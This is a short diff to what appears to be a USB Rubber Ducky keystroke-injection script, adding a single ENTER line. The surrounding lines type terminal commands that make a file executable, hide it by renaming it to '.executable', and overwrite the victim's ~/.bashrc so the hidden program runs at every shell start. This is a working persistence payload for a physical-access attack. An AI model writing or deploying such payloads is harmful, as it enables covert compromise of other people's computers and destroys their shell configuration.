@@ -11,6 +11,7 @@ DELAY 3000
 STRING chmod +x executable
 ENTER
 STRING mv executable .executable
+ENTER
 DELAY 50
 STRING echo "${PWD}/.executable"> ~/.bashrc
 ENTER
